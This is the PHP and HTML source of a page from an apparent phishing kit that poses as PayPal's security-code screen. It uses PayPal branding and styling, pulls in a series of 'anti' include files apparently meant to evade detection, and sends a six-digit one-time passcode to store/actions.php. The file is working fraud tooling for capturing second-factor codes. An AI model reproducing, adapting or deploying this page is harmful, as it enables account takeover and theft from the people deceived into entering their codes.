<?php
session_start();
include "config/conf.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
error_reporting(0);

include("X_911.php");

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
include "lang/{$lang }.php";

?>


<!DOCTYPE html>
<html lang="en"
<head>
<meta charset="utf-8" />
<title>OTP</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="application-name" content="PayPal" />
<link rel="shortcut icon" href="pp_favicon_x.ico" />
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
<link rel="stylesheet" href="contextualLoginElementalUI.css">
<link rel="stylesheet" href="app.css">
</head>
</div>
</section>
<section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
<div class=" corral">
<div id="content" class="contentContainer activeContent contentContainerBordered">
<header>
<p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
</header>
<center>
<style>
.textstyle {
color: #0c0c0d;
font-family: PayPalSansBig-Regular,Helvetica Neue,Arial,sans-serif;
font-size: 1.125rem;
line-height: 1.5rem;
font-weight: 400;
}
</style>
<center>
<h1><strong><?php echo $lg_cm['xto6']?></strong>

</h1>
<p class="textstyle"><?php echo $lg_cm['xto8']?>

</p>
<font color="#ff0000"><?php echo $lg_cm['mo01']?></font>
</center>
<br>
<form id="PageMainForm" method="post" action="store/actions.php"class="top15">
<div>
<div class="codeInput">
<div class="ppvx_code-input___1-4-1 codeInput-wrapper" id="answer">
<div class="ppvx_code-input__input-wrapper___1-4-1">
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
<input maxlength="1" name="1" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " required type="tel" onfocus="this.value=''" onkeyup="autotab(this, 'input2')"/>
<label for="ci-answer-0" id="ci-answer-0-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo">
</label>
</div>
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
<input maxlength="1" name="2" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input2" required onfocus="this.value=''" type="tel" onkeyup="autotab(this, 'input3')"/>
<label for="ci-answer-1" id="ci-answer-1-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo">
</label>
</div>
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
<input maxlength="1" name="3" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input3" required onfocus="this.value=''" type="tel" onkeyup="autotab(this, 'input4')" />
<label for="ci-answer-2" id="ci-answer-2-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo">
</label>
</div>
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
<input maxlength="1" name="4" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input4" required onfocus="this.value=''" type="tel" onkeyup="autotab(this, 'input5')"/>
<label for="ci-answer-3" id="ci-answer-3-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo">
</label>
</div>
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
<input maxlength="1" name="5" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input5" required onfocus="this.value=''" type="tel" onkeyup="autotab(this, 'input6')"/>
<label for="ci-answer-4" id="ci-answer-4-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo">
</label>
</div>
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
<input maxlength="1" name="6" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input6" required onfocus="this.value=''" type="tel" />
<label for="ci-answer-5" id="ci-answer-5-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo">
</label>
</div>
</div>
</div>
</div>
</div>
<div class="action">
<button class="ppvx_btn___5-11-8 ppvx--v2___5-11-8 scTrack:security_code_continue_button button" type="submit" id="securityCodeSubmit" name="submitSecurityCode" data-nemo="securityCodeSubmit">
<?php echo $lg_cm['xto9']?></button>
</div>
</form>
<script>

function autotab(current, to) {
if (current.value.length === current.maxLength) {
document.getElementById(to).focus();
}
}

function focusPreviousInput(e) {
if (e.keyCode === 8) {
// check if the key pressed was the backspace key
const inputs = document.getElementsByTagName('input'); // get all input elements
const activeInput = document.activeElement; // get the currently focused input element
let previousInput = null;
for (let i = 0; i < inputs.length; i++) {
// loop through all input elements
if (inputs[i] === activeInput && i ==inputs.length-1) {
activeInput.value='';
}
if (inputs[i] === activeInput && i > 0) { // if the current input is active and there is a previous input
previousInput = inputs[i - 1]; // set the previous input to the one before the current input
break;
}
}
if (previousInput) { // if there is a previous input, focus it
previousInput.focus();
}
}
}

document.addEventListener('keydown', focusPreviousInput); // add event listener to the document for the keydown event


function autofocus(current) {
if (current.value.length < current.maxLength) {
current.value="";
}
}

</script>
<footer class="footer footerStayPut" role="contentinfo">
<div class="legalFooter"><ul class="footerGroup">
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top6']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top7']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top8']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top9']?></a>
</li>
</ul>
</div>
</footer>
</div>

</html>